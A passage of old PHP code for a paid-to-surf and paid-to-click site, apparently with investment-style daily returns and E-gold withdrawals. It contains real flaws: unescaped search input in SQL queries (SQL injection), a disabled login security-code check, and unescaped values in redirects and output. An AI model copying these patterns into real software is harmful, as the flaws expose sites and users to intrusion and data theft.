	$smarty->assign('show_error',createAccount($_POST[username],$_POST[password],$_POST[password2],$_POST[email],$_POST[name],$procs,$_POST[refer],$_POST[code]));
	$smarty->assign('action', "register");
	$_GET[n]="register";
}

if ($_GET[action]=="logout") {

	session_start();

	$SessionID = mysql_escape_string(@$HTTP_SESSION_VARS['SessionID']);

	$result=mysql_query("DELETE FROM sessions WHERE sessionid='$SessionID'") 
             or die ("MySql Authorization Error!!! 1".mysql_error());

	session_destroy();

	header("Location: /");
	die();

}

if ($_GET[action]=="login") {

	$user	=mysql_escape_string($_POST[username]);
	$pass	=mysql_escape_string($_POST[password]);
	$code	=mysql_escape_string($_POST[code]);
	$key	=mysql_escape_string($_POST[key]);

	//if (CheckCode($code,$key)==TRUE) {
		$LoginError=CheckData($user,$pass,$code);
	//} else {
	//	$LoginError="Login security code is either invalid or expired!";
	//}

}

if ($_GET[n]=="withdraw") {

	$result=mysql_query("SELECT * FROM merchants WHERE active='1'");
	while ($row=mysql_fetch_array($result)) { 
		$temp_array=array(array("name" => $row[name], "id" => $row[id] , "balance" => number_format(GetTypeBalance($row[name]),2)));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);
	if ($_GET[step]==1) {
		$result=mysql_query("SELECT * FROM merchants WHERE active='1' AND name='".mysql_escape_string($_POST[method])."'");
		$merchantinfo=mysql_fetch_array($result);
		if(is_numeric($_POST[amount])===FALSE) { $_POST[amount]=0; }
		if ($_POST[amount]>GetTypeBalance(mysql_escape_string($_POST[method]))) {
			$_GET[step]="";
			$show_error="You can not withdraw that much!";
		} else if ($_POST[amount]<$merchantinfo[min_withdraw]) {
			$_GET[step]="";
			$show_error="You must withdraw at least $".number_format($merchantinfo[min_withdraw],2);
		}
	}


	$smarty->assign('step2_amount',$_GET[amount]);
	$smarty->assign("step2_account_id", $_GET[account]);
	$smarty->assign("step2_batch", $_GET[batch]);


	$smarty->assign('merchants',$array1);
	$smarty->assign("step", $_GET[step]);
	$smarty->assign("step1_method", $_POST[method]);
	$smarty->assign("step1_amount", $_POST[amount]);
	$smarty->assign("step1_account_id", $_POST[account_id]);
	$smarty->assign("merchantinfo", $merchantinfo);
	$smarty->assign("show_error", $show_error);
}

if ($_GET[action]=="top") {
	echo("<body bgcolor=\"#E4E4E4\"><br><center>Surfing has been disabled by web administrator!");
	die();
	$smarty->compile_check = true;
	$smarty->assign ('valid', $valid);
	$smarty->assign ('userinfo', $userinfo);
	$smarty->assign ('time', time());
	$smarty->template_dir = './style/';
	$smarty->compile_dir = './temp_data';
	$smarty->display ('top_bar.tpl');
	die();
}

if ($_GET[n]=="surf") {
	echo("<frameset rows=110,* border=0><frame marginheight=0 marginwidth=0 scrolling=no noresize border=0 src=\"/?n=surf_bar\"><frame marginheight=0 marginwidth=0 scrolling=auto noresize border=0 src=/?n=target></frameset>");
	die();
}

if ($_GET[n]=="surf_bar") {
	$todays_date=date("m-d-y");

	$result=mysql_query("SELECT * FROM surf_history WHERE username='$userinfo[username]' AND date='$todays_date'");
	if (mysql_num_rows($result)==0) {
		mysql_query("INSERT INTO `surf_history` ( `id` , `username` , `date` , `paid` , `credits_earned` , `site_views` ) VALUES (NULL , '$userinfo[username]', '$todays_date', '0', '0', '0')");
		$result=mysql_query("SELECT * FROM surf_history WHERE username='$userinfo[username]' AND date='$todays_date'");
	}
	
	$surfinfo=mysql_fetch_array($result);
	$timenow=time();

	if (($settings[surf_page_refresh]-1)+$surfinfo[last_surf] < $timenow && $settings[max_views]>=$surfinfo[site_views]) {
		$result=mysql_query("SELECT * FROM sites WHERE credits>'0' AND enabled='1' ORDER BY rand() LIMIT 1");
		$siteinfo=mysql_fetch_array($result);
		
		$result=mysql_query("SELECT * FROM upgrades WHERE username='$userinfo[username]' AND days_left>='0'");
		$isFree=mysql_num_rows($result);
	
		if ($isFree==0) {
			$creditAmount=$settings[free_member_credits];
		} else {	
			$creditAmount=$settings[pro_member_credits];
		}
		
		mysql_query("UPDATE sites SET credits=credits-'1' WHERE id='$siteinfo[id]'");	

		mysql_query("UPDATE surf_history SET last_surf='$timenow', site_views=site_views+1,credits_earned=credits_earned+'$creditAmount' WHERE username='$userinfo[username]' AND date='$todays_date'");		
		mysql_query("UPDATE accounts SET credits=credits+'$creditAmount' WHERE username='$userinfo[username]'");

		if ($surfinfo[site_views]>=$settings[surf_required] && $surfinfo[paid]==0 && $isFree!=0) {
			$result=mysql_query("SELECT * FROM upgrades WHERE username='$userinfo[username]' AND days_left>'0'");
			while($row=mysql_fetch_array($result)) {
			$maxcashtoday=$row[amount]*($settings[daily_percent]/100);
	
			mysql_query("INSERT INTO `history` ( `id` , `username` , `amount` , `type` , `date` , `datetime` , `source` , `paid` , `ref_id` , `account_id` ) VALUES (NULL , '$userinfo[username]', '$maxcashtoday', '4', '".time()."', '".time()."', '$row[method]', '1', '0', '0')");
	
			mysql_query("UPDATE upgrades SET days_left=days_left-'1' WHERE username='$userinfo[username]' AND id='$row[id]'");
			}
			mysql_query("UPDATE surf_history SET paid='1' WHERE id='$surfinfo[id]'");
		}
		if ($isFree==0 && $settings[free_surf]!="1") {
		$is_run=2;
		} else {
		$is_run=1;
		}
	} else {
		if ($isFree==0 && $settings[free_surf]!="1") {
		$is_run=2;
		} else {
			if ($settings[max_views]<=$surfinfo[site_views]) {
			$is_run=3;
			} else {
			$is_run=0;
			}
		}
	}

	$smarty->assign ('is_run', $is_run);
	$smarty->assign ('surfinfo', $surfinfo);
	$smarty->assign ('siteinfo', $siteinfo);

}


if ($_GET[n]=="admin_index" && $userinfo[is_admin]==1) {
	$todays_date=date("m-d-y");

	$todays_date_raw=strtotime($todays_date);

	$result=mysql_query("SELECT * FROM accounts");
	$showdata[total_accounts]=number_format(mysql_num_rows($result),0);

	$result=mysql_query("SELECT * FROM accounts WHERE join_date='$todays_date'");
	$showdata[total_accounts_today]=number_format(mysql_num_rows($result),0);

	$result=mysql_query("SELECT sum(amount) FROM history WHERE type='1'");
	$showdata[total_deposited]=mysql_result($result,0);

	$result=mysql_query("SELECT * FROM history WHERE type='1'");
	$showdata[total_deposited_today]=0;
		while($row=mysql_fetch_array($result)) {
			if (date("m-d-y",$row[date])==$todays_date) {
			$showdata[total_deposited_today]=$showdata[total_deposited_today]+$row[amount];
			}
		}

	$result=mysql_query("SELECT sum(amount) FROM history WHERE type='2'");
	$showdata[total_withdrawn]=mysql_result($result,0);

	$result=mysql_query("SELECT * FROM history WHERE type='2'");
	$showdata[total_withdrawn_today]=0;
		while($row=mysql_fetch_array($result)) {
			if (date("m-d-y",$row[date])==$todays_date) {
			$showdata[total_withdrawn_today]=$showdata[total_withdrawn_today]+$row[amount];
			}
		}


	$showdata[est_profit]=number_format($showdata[total_deposited]-$showdata[total_withdrawn],2);

	$result=mysql_query("SELECT sum(count) FROM hits");
	$showdata[total_site_hits]=number_format(mysql_result($result,0),0);

	$result=mysql_query("SELECT sum(count) FROM hits WHERE date='$todays_date'");
	$showdata[total_site_hits_today]=number_format(mysql_result($result,0),0);

	$result=mysql_query("SELECT * FROM accounts WHERE refer!='0'");
	$temp[0]=mysql_num_rows($result);
	$result=mysql_query("SELECT * FROM accounts");
	$temp[1]=mysql_num_rows($result);	
	$temp[2]=$temp[0]/$temp[1];
	$temp[3]=$showdata[total_deposited]*$RETURN_PERCENT;
	
	$temp[5]=$temp[3]+($temp[2]*($showdata[total_deposited]*$REF_PERCENT));	

	$temp[4]=number_format($temp[5],2);
	
	$smarty->assign ('showdata', $showdata);
	
}

if ($_GET[n]=="admin_managemembers" && $userinfo[is_admin]==1) {

	if ($_GET[page]=="") {
		$_GET[page]=1;
	}

	if ($_GET[sort]=="") {
		$_GET[sort]="id";
	}

	if ($_GET[mode]=="") {
		$_GET[mode]="DESc";
	}

	if ($_GET[mode]=="DESC") {
		$NEWMODE="ASC";
	} else {
		$NEWMODE="DESC";
	}
	if ($_GET[search]!="") {
		$temp_search=$_GET[search];
		$CHECKSTRING="WHERE id='$temp_search' OR username='$temp_search' OR email='$temp_search' OR name='$temp_search'";
	}

	$temp_mode=mysql_escape_string($_GET[mode]);
	$temp_sort=mysql_escape_string($_GET[sort]);

	$gostart=30*($_GET[page]-1);


	$result=mysql_query("SELECT * FROM `accounts` $CHECKSTRING") OR die(mysql_error());
	$TOTAL_COUNT=floor(mysql_num_rows($result)/30)+1;

	$result=mysql_query("SELECT * FROM `accounts` $CHECKSTRING ORDER BY `$temp_sort` $temp_mode LIMIT $gostart , 30");
	while($row=mysql_fetch_array($result)) {
		if ($row[join_datetime]=="") { $row[join_datetime]=0; }
		$temp_join_date=date("D M j Y",$row[join_datetime]);
		$temp_join_time=date("g:i:s a T",$row[join_datetime]);
		$result2=mysql_query("SELECT sum(amount) FROM upgrades WHERE username='$row[username]' AND days_left>'0'");
		$active_deposit=number_format(mysql_result($result2,0),2);
		$temp_array=array(array("id" => $row[id], "username" => $row[username], "active_deposit" => $active_deposit, "join_date" => $temp_join_date, "join_time" => $temp_join_time));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
	}

	$array2=array("1");
	for ($i = 2; $i <= $TOTAL_COUNT; $i++) {
		$array2=array_merge($array2,array($i));
	}
	$smarty->assign('page_vars', str_replace("&page=$_GET[page]", "", $_SERVER[QUERY_STRING]));
	$smarty->assign('page_count',$TOTAL_COUNT);
	$smarty->assign('current_page', mysql_escape_string($_GET[page]));
	$smarty->assign('page_array',$array2);
	$smarty->assign('my_referral_count',mysql_num_rows($result));
	$smarty->assign('referrals',$array1);
	$smarty->assign('myget',$_GET);

}

if ($_GET[n]=="sitelist") {

	$array1="";


	$temp_from_time	=strtotime(mysql_escape_string($_GET[FromMonth])."/".mysql_escape_string($_GET[FromDay])."/".mysql_escape_string($_GET[FromYear]));
	$temp_to_time	=strtotime(mysql_escape_string($_GET[ToMonth])."/".mysql_escape_string($_GET[ToDay])."/".mysql_escape_string($_GET[ToYear]));

	if ($_GET[FromMonth]=="") {
		$temp_from_time=time()-(60*60*24*30);
	}
	if ($_GET[FromMonth]=="") {
		$temp_to_time=time();
	}
	
	if ($temp_from_time >= $temp_to_time) {
		$temp_from_time=$temp_to_time-(60*60*24);
	}
	
	if ($_GET[page]=="") { $_GET[page]=1; }

	$_GET[page]=mysql_escape_string($_GET[page]);
	$limit_start=(($_GET[page])*20)-20;

	$result=mysql_query("SELECT * FROM sites WHERE username='$userinfo[username]'");
	$smarty->assign('my_referral_count',mysql_num_rows($result));
	$temp_page_count=floor(mysql_num_rows($result)/20)+1;
	$rawtotal=number_format(mysql_num_rows($result),0);
	$result=mysql_query("SELECT * FROM sites WHERE username='$userinfo[username]' LIMIT $limit_start, 20");
	while ($row=mysql_fetch_array($result)) {
		$row[credits]=number_format($row[credits],0);
		$row[views_today]=number_format($row[views_today],0);
		$temp_array=array(array("id" => $row[id], "title" => $row[title], "credits" => $row[credits], "views_today" => $row[views_today]));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);
	//$array1=array_merge($array1,array("" => "All"));

	$array2=array("1");
	for ($i = 2; $i <= $temp_page_count; $i++) {
		$array2=array_merge($array2,array($i));
	}
	$smarty->assign('page_vars', str_replace("&page=$_GET[page]", "", $_SERVER[QUERY_STRING]));
	$smarty->assign('page_count',$temp_page_count);
	$smarty->assign('current_page', mysql_escape_string($_GET[page]));
	$smarty->assign('page_array',$array2);
	$smarty->assign('rawtotal',$rawtotal);
	$smarty->assign('my_referral_count',mysql_num_rows($result));
	$smarty->assign('referrals',$array1);

}

if ($_GET[action]=="createsite") {
	$tempinfo[title]=mysql_escape_string($_POST[site_title]);
	$tempinfo[url]	=mysql_escape_string($_POST[site_url]);

	if (strlen($tempinfo[title])<2) {
		$show_error="Title is too short!";
	} else if ($tempinfo[url]=="") {
		$show_error="URL must not be blank!";
	} else if (strpos($tempinfo[url],"http")===FALSE) {
		$show_error="HTTP or HTTPS must be includes in the url.";
	} else {
		$tempinfo[title]=substr($tempinfo[title],0,10);
		mysql_query("INSERT INTO `sites` ( `id` , `username` , `credits` , `url` , `title` , `enabled` , `views` , `views_today` ) VALUES (NULL , '$userinfo[username]', '0', '$tempinfo[url]', '$tempinfo[title]', '1', '', '')");
		header("Location: /?n=sitelist");
		die();
	}

	$smarty->assign('show_error',$show_error);
	$_GET[n]="createsite";
}

if ($_GET[action]=="click") {

	$result=mysql_query("SELECT sum(amount) FROM upgrades WHERE username='$userinfo[username]' AND days_left>'0'");
	$upgradeTotal=mysql_result($result,0);

	if ($upgradeTotal=="0" || $upgradeTotal=="") {
		$amount_paid="0.002";
	} else {
		$amount_paid=($upgradeTotal*.08)/5;
	}

	$todays_date=date("m-d-y");

	$result=mysql_query("SELECT `clicks` FROM `clicks` WHERE `username`='$userinfo[username]' AND `date`='$todays_date'");
	if (mysql_num_rows($result)==0) {
		$clicks_left=5;
		mysql_query("INSERT INTO `clicks` ( `id` , `username` , `date` , `clicks` ) VALUES (NULL , '$userinfo[username]', '$todays_date', '1');");
	} else {
		$clicks_left=mysql_result($result,0);
		$clicks_left=5-$clicks_left;
		if ($clicks_left==0) {
			header("Location: /?n=ptc&show_error=limit");
			die();
		}
		mysql_query("UPDATE clicks SET clicks=clicks+'1' WHERE username='$userinfo[username]' AND date='$todays_date'");
		
	}

	if ($clicks_left-1<1) {
		mysql_query("UPDATE upgrades SET days_left=days_left-'1',last_paid='$todays_date' WHERE username='$userinfo[username]' AND last_paid!='$todays_date'");
	}

	if ($clicks_left!=0) {
		$temp_id=mysql_escape_string($_GET[id]);
		$result=mysql_query("SELECT * FROM sites WHERE id='$temp_id'");
		$siteinfo=mysql_fetch_array($result);
		mysql_query("UPDATE sites SET credits=credits-'1' WHERE id='$temp_id'");

		mysql_query("INSERT INTO `history` ( `id` , `username` , `amount` , `type` , `date` , `datetime` , `source` , `paid` , `ref_id` , `account_id` ) VALUES (NULL , '$userinfo[username]', '$amount_paid', '4', '".time()."', '".time()."', 'E-gold', '1', '0', '0')");
		

		header("Location: $siteinfo[url]");
		
	}
	

}

if ($_GET[n]=="ptc") {

	$result=mysql_query("SELECT * FROM sites WHERE credits > '0' AND enabled='1' ORDER BY RAND() LIMIT 4");
	$mcount2=mysql_num_rows($result);
	while ($row=mysql_fetch_array($result)) { 
		$temp_array=array(array("id" => $row[id], "title" => $row[title]));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
		
	}

	$result=mysql_query("SELECT sum(amount) FROM upgrades WHERE username='$userinfo[username]' AND days_left>='0'");
	$upgradeTotal=number_format(mysql_result($result,0),2);

	if ($upgradeTotal=="0") {
		$amount_paid="0.002";
	} else {
		$amount_paid=($upgradeTotal*.08)/5;
	}

	$todays_date=date("m-d-y");

	$result=mysql_query("SELECT `clicks` FROM `clicks` WHERE `username`='$userinfo[username]' AND `date`='$todays_date'");
	if (mysql_num_rows($result)==0) {
		$clicks_left=5;
	} else {
		$clicks_left=mysql_result($result,0);
		$clicks_left=5-$clicks_left;
	}

	if ($clicks_left==0) {
		$do_show=0;
	} else {
		$do_show=1;
	}

	$smarty->assign('do_show',$do_show);
	$smarty->assign('clicks_left',$clicks_left);
	$smarty->assign('amount_paid',$amount_paid);

	$smarty->assign('ptclist',$array1);

}
	

if ($_GET[n]=="target") {
	die();
}

if ($_GET[action]=="withdraw") {
	$result=mysql_query("SELECT * FROM merchants WHERE active='1' AND name='".mysql_escape_string($_POST[method])."'");
	$merchantinfo=mysql_fetch_array($result);
	if(is_numeric($_POST[amount])===FALSE) { $_POST[amount]=0; }
		if ($_POST[amount]>GetTypeBalance(mysql_escape_string($_POST[method]))) {
			$_GET[step]="";
			$show_error="You can not withdraw that much!";
			$_GET[n]="withdraw";
		} else if ($_POST[amount]<$merchantinfo[min_withdraw]) {
			$_GET[step]="";
			$show_error="You must withdraw at least $".number_format($merchantinfo[min_withdraw],2);
			$_GET[n]="withdraw";
		} else {
			$ispaid=0;
			if ($merchantinfo[name]=="E-gold" && $merchantinfo[instant]==1) {
				$sendresult=EgoldSendMoney(mysql_escape_string($_POST[account_id]), $_POST[amount]);
				if ($sendresult!=0) {
					$ispaid=1;
					$ref_id=$sendresult;
				}
			}
			mysql_query("INSERT INTO `history` ( `id` , `username` , `amount` , `type` , `date` , `datetime` , `source` , `paid` , `ref_id`, `account_id` ) VALUES (NULL , '$userinfo[username]', '$_POST[amount]', '2', '".time()."', '".time()."', '$merchantinfo[name]', '$ispaid', '$ref_id', '".mysql_escape_string($_POST[account_id])."')");
			header("Location: /?n=withdraw&step=2&amount=$_POST[amount]&batch=$sendresult&account=$_POST[account_id]");
			//header("Location: /?n=history");
		}

	$smarty->assign('merchants',$array1);
	$smarty->assign("step", $_GET[step]);
	$smarty->assign("step1_method", $_POST[method]);
	$smarty->assign("step1_amount", $_POST[amount]);
	$smarty->assign("step1_account_id", $_POST[account_id]);
	$smarty->assign("merchantinfo", $merchantinfo);
	$smarty->assign("show_error", $show_error);
}

if ($_GET[n]=="admin_make_payouts" && $userinfo[is_admin]==1) {

	if ($_GET[step]=="")	{

	$result=mysql_query("SELECT * FROM merchants WHERE active='1'");
	while ($row=mysql_fetch_array($result)) { 
		$result2=mysql_query("SELECT sum(amount) FROM history WHERE paid='0' AND type='2' AND source='$row[name]'");
		$totalamount=number_format(mysql_result($result2,0),2);
		$result2=mysql_query("SELECT * FROM history WHERE paid='0' AND type='2' AND source='$row[name]'");
		$totalcount=mysql_num_rows($result2);
		$temp_array=array(array("name" => $row[name], "id" => $row[id], "totalamount" => $totalamount, "totalcount" => $totalcount));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
		
	}
	$smarty->assign('merchants',$array1);
	}
	
	if ($_GET[step]=="1") {

	$result=mysql_query("SELECT * FROM merchants WHERE id='".mysql_escape_string($_GET[id])."'");
	$merchantinfo=mysql_fetch_array($result);
	
	$result2=mysql_query("SELECT * FROM history WHERE paid='0' AND type='2' AND source='$merchantinfo[name]'");
	while ($row=mysql_fetch_array($result2)) { 
		$temp_array=array(array("username" => $row[username], "id" => $row[id] , "amount" => number_format($row[amount],2), "account_id" => $row[account_id]));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);

	$smarty->assign('merchants',$array1);

	}	

	$smarty->assign('step',$_GET[step]);
	$smarty->assign('id',$_GET[id]);
	$smarty->assign('mass_pay',$merchantinfo[mass_pay]);

}

if ($_GET[n]=="admin_edit_user" && $userinfo[is_admin]==1) {
	$temp_id=mysql_escape_string($_GET[id]);
	$result=mysql_query("SELECT * FROM accounts WHERE id='$temp_id'");
	$targetinfo=mysql_fetch_array($result);


	$temp_from_time	=strtotime(mysql_escape_string($_GET[FromMonth])."/".mysql_escape_string($_GET[FromDay])."/".mysql_escape_string($_GET[FromYear]));
	$temp_to_time	=strtotime(mysql_escape_string($_GET[ToMonth])."/".mysql_escape_string($_GET[ToDay])."/".mysql_escape_string($_GET[ToYear]));
	
	if ($_GET[FromMonth]=="") {
		$temp_from_time=time()-(60*60*24*30);
	}
	if ($_GET[FromMonth]=="") {
		$temp_to_time=time()+86400;
	}
	
	if ($temp_from_time >= $temp_to_time) {
		$temp_from_time=$temp_to_time-(60*60*24);
	}

	if ($_GET[merchant]=="") { $_GET[merchant]=""; }
	$smarty->assign('merchant',$_GET[merchant]);

	$array1="";

	$result=mysql_query("SELECT * FROM merchants WHERE active='1'");
	while ($row=mysql_fetch_array($result)) {
		$merchant_data["$row[id]"]=$row[name]; 
		$temp_array=array("i".$row[id] => $row[name]);
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);
	$array1=array_merge($array1,array("" => "All"));
	$smarty->assign('merchants',$array1);


	$array1="";
	$array2="";
	$temp_merch=mysql_escape_string(str_replace("i","",$_GET[merchant]));
	$tmdc=$merchant_data["$temp_merch"];
	if ($_GET[page]=="") { $_GET[page]=1; }
	$_GET[page]=mysql_escape_string($_GET[page]);
	$limit_start=($_GET[page]-1)*20;
	$temp_merch_sql="";
	if ($_GET[merchant]!="") { $temp_merch_sql=" AND source='$tmdc'"; }
	$result=mysql_query("SELECT * FROM history WHERE username='$targetinfo[username]'$temp_merch_sql AND date <= '$temp_to_time' AND date >= '$temp_from_time'") OR die(mysql_error());
	$temp_page_count=ceil(mysql_num_rows($result)/20);
	$result=mysql_query("SELECT * FROM history WHERE username='$targetinfo[username]'$temp_merch_sql AND date <= '$temp_to_time' AND date >= '$temp_from_time' LIMIT $limit_start, 20") OR die(mysql_error());
	while ($row=mysql_fetch_array($result)) { 
		$temp_date=date("D M j Y",$row[date]);
		$temp_time=date("g:i:s a T",$row[date]);
			$show_sign="";
			if ($row[type]==1) {
				$temp_type="Deposit";
			} else if ($row[type]==2) {
				if ($row[paid]==0) {
					$temp_type="Withdraw<br><font color=\"orange\" size=1>Pending</font>";
				} else {
					$temp_type="Withdraw";
				}
				$show_sign="-";
			} else if ($row[type]==3) {
				$temp_type="Bonus";
			} else if ($row[type]==4) {
				$temp_type="Earnings";
			}
		$show_amount=$show_sign.number_format($row[amount],2);
		$temp_array=array(array("type" => $temp_type , "amount" => $show_amount, "source" => $row[source], "date" => $temp_date, "time" => $temp_time));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
	}
	
	$array2=array("1");
	for ($i = 2; $i <= $temp_page_count; $i++) {
		$array2=array_merge($array2,array($i));
	}
	$smarty->assign('page_vars', str_replace("&page=$_GET[page]", "", $_SERVER[QUERY_STRING]));
	$smarty->assign('page_count',$temp_page_count);
	$smarty->assign('current_page', mysql_escape_string($_GET[page]));
	$smarty->assign('page_array',$array2);
	$smarty->assign('my_history_count', mysql_num_rows($result));
	//$array1=mysql_fetch_array($result);
	$smarty->assign('to_time',$temp_to_time);
	$smarty->assign('from_time',$temp_from_time);
	$smarty->assign('my_history',$array1);
	
	$smarty->assign('id',$temp_id);
	$smarty->assign('saved',$_GET[saved]);
	$smarty->assign('targetinfo',$targetinfo);
	
}

if ($_GET[action]=="addreply") {

	$ticket_id	=mysql_escape_string($_GET[ticket_id]);
	$ticket_email	=mysql_escape_string($_GET[ticket_email]);
	$temp_message	=mysql_escape_string($_POST[message]);
	
	$ticketStatus=AddTicketReply($ticket_id,$ticket_email,$temp_message);
	
	if ($ticketStatus=="1") {
		header("Location: /?n=checkticket&ticket_id=$ticket_id&ticket_email=$ticket_email");
	} else {
		$smarty->assign('showtext',$ticketStatus."<br>");
		$_GET[n]="checkticket";
	}
	

}

function AddTicketReply($ticket_id,$ticket_email,$temp_message) {

	global $ip;
	$result=mysql_query("SELECT * FROM ticket_reply WHERE ticket_key='$ticket_id' AND message='$temp_message'");

	if ($temp_message=="") {
		return "Message must not be left blank!";
	} else if (mysql_num_rows($result)>0) {
		return "You may not post the same thing twice!";
	} else {

	mysql_query("INSERT INTO `ticket_reply` ( `id` , `ticket_key` , `is_self` , `message` , `datetime`, `ip` ) VALUES (NULL , '$ticket_id', '1', '$temp_message', '".time()."', '$ip')");
	mysql_query("UPDATE tickets SET status='1' WHERE `ticket_key`='$ticket_id' LIMIT 1");
		return "1";
	}
}

if ($_GET[n]=="checkticket") {
	
	$ticket_id	=mysql_escape_string($_GET[ticket_id]);
	$ticket_email	=mysql_escape_string($_GET[ticket_email]);
	
		
	$result=mysql_query("SELECT * FROM tickets WHERE ticket_key='$ticket_id' AND email='$ticket_email'");
	$ticketinfo=mysql_fetch_array($result);
	
	if (mysql_num_rows($result)==1) {
		$smarty->assign('is_found',1);
	}
	
	if ($ticketinfo[status]==1) {
		$ticketinfo[status]="<font color=green>Open</font>";
	} else {
		$ticketinfo[status]="<font color=red>Closed</font>";
	}

	if ($ticketinfo[priority]=="1") {
		$ticketinfo[show_pri]="<font color=yellow size=1>(Low)</font>";
	} else if ($ticketinfo[priority]=="2") {
		$ticketinfo[show_pri]="<font color=orange size=1>(Medium)</font>";
	} else if ($ticketinfo[priority]=="3") {
		$ticketinfo[show_pri]="<font color=red size=1>(High)</font>";
	} else if ($ticketinfo[priority]=="4") {
		$ticketinfo[show_pri]="<font color=purple size=1>(Critical)</font>";
	} else if ($ticketinfo[priority]=="5") {
		$ticketinfo[show_pri]="<font color=red size=1>(Spam Report)</font>";
	}

	$smarty->assign('showdate',date("F j, Y, g:i a",$ticketinfo[datetime]));

	$smarty->assign('ticketinfo',$ticketinfo);

	if (mysql_num_rows($result)==1) {
	$bgcolor="#F4F4F4";
	$result=mysql_query("SELECT * FROM ticket_reply WHERE ticket_key='$ticketinfo[ticket_key]' ORDER BY `datetime` ASC ");
	while ($row=mysql_fetch_array($result)) { 
		if ($bgcolor=="#F4F4F4") { 
			$bgcolor="#FFFFFF";
		} else {
			$bgcolor="#F4F4F4";
		}
		
		if ($row[is_self]=="1") {
			$tellwho="Your";		
		} else {
			$tellwho="Admin";
		}

		$fixedtime=date("F j, Y, g:i a",$row[datetime]);
		$temp_array=array(array("ticket_key" => $row[ticket_key], "message" => $row[message] , "datetime" => $fixedtime, "bgcolor" => $bgcolor, "tellwho" => $tellwho));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
	}

	}

	$smarty->assign('ticket_id',$_GET[ticket_id]);
	$smarty->assign('is_first',$_GET[is_first]);
	$smarty->assign('reply_history',$array1);

}

if ($_GET[action]=="newticket") {

	$temp_username	=mysql_escape_string($_POST[username]);
	$temp_email	=mysql_escape_string($_POST[email]);
	$temp_subject	=mysql_escape_string($_POST[subject]);
	$temp_priority	=mysql_escape_string($_POST[priority]);
	$temp_message	=mysql_escape_string($_POST[message]);

	$ticketid=md5("$temp_username $temp_email $temp_subject $temp_message".rand(1,1000).rand(1,1000));

	$msgstatus=CreateTicket($temp_username,$temp_email,$temp_subject,$temp_priority,$temp_message,$ticketid);

	if ($msgstatus==1) {
		//$showtext="<font color=\"green\">Your trouble ticket has been submitted!</font><br><br>";
		header("Location: /?n=checkticket&ticket_id=$ticketid&ticket_email=$temp_email&is_first=1");
	} else {
		$showtext="<font color=\"red\">".$msgstatus."</font><br><br>";
	}

	$_GET[n]="contact";

	$smarty->assign('showtext',$showtext);

}

if ($_GET[n]=="admin_merchants" && $userinfo[is_admin]==1) {

	if ($_GET[step]=="")	{

	$result=mysql_query("SELECT * FROM merchants WHERE active='1'");
	while ($row=mysql_fetch_array($result)) { 
		$temp_array=array(array("name" => $row[name], "id" => $row[id], "totalamount" => $totalamount, "totalcount" => $totalcount, "hard_coded" => $hard_coded));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
		
	}
	$smarty->assign('merchants',$array1);

	$array1="";

	$result=mysql_query("SELECT * FROM merchants WHERE active='0'");
	$mcount2=mysql_num_rows($result);
	while ($row=mysql_fetch_array($result)) { 
		$temp_array=array(array("name" => $row[name], "id" => $row[id], "totalamount" => $totalamount, "totalcount" => $totalcount));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
		
	}
	$smarty->assign('merchants2',$array1);
	$smarty->assign('merchants2_count',$mcount2);
	}
	
	if ($_GET[step]=="1") {

	$result=mysql_query("SELECT * FROM merchants WHERE id='".mysql_escape_string($_GET[id])."'");
	$merchantinfo=mysql_fetch_array($result);
	
	$result2=mysql_query("SELECT * FROM history WHERE paid='0' AND type='2' AND source='$merchantinfo[name]'");
	while ($row=mysql_fetch_array($result2)) { 
		$temp_array=array(array("username" => $row[username], "id" => $row[id] , "amount" => number_format($row[amount],2), "account_id" => $row[account_id]));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);

	$smarty->assign('merchants',$array1);

	}	

	if ($_GET[step]=="2") {

	$result=mysql_query("SELECT * FROM merchants WHERE id='".mysql_escape_string($_GET[id])."'");
	$merchantinfo=mysql_fetch_array($result);
	
	//$array1=mysql_fetch_array($result);

	$smarty->assign('merchants',$array1);

	}	

	$smarty->assign('step',$_GET[step]);
	$smarty->assign('id',$_GET[id]);
	$smarty->assign('merchantinfo',$merchantinfo);
	$smarty->assign('mass_pay',$merchantinfo[mass_pay]);

}

if ($_GET[action]=="save_merchant_pay_code" && $userinfo[is_admin]==1) {

	$tempid=mysql_escape_string($_GET[id]);
	mysql_query("UPDATE merchants SET pay_code='".mysql_escape_string($_POST[pay_code])."' WHERE id='$tempid'");
	header("Location: /?n=admin_merchants");

}

if ($_GET[n]=="admin_edit_masspay" && $userinfo[is_admin]==1) {
	$result=mysql_query("SELECT * FROM merchants WHERE id='".mysql_escape_string($_GET[id])."'");
	$merchantinfo=mysql_fetch_array($result);
	$smarty->assign('merchantinfo',$merchantinfo);
	$smarty->assign('id',$_GET[id]);
}

if ($_GET[action]=="admin_add_new_merchant" && $userinfo[is_admin]==1) {
	$temp_name=mysql_escape_string($_POST[name]);
	mysql_query("INSERT INTO `merchants` ( `id` , `name` , `field` , `active` , `eta` , `instant` , `min_withdraw` , `mass_pay` , `pay_code` , `hard_coded` ) VALUES (NULL , '$temp_name', '$temp_name', '1', '-', '0', '0.01', '', '', '0')");
	header("Location: /?n=admin_merchants");
	die();
}

if ($_GET[action]=="admin_enable_merchant" && $userinfo[is_admin]==1) {
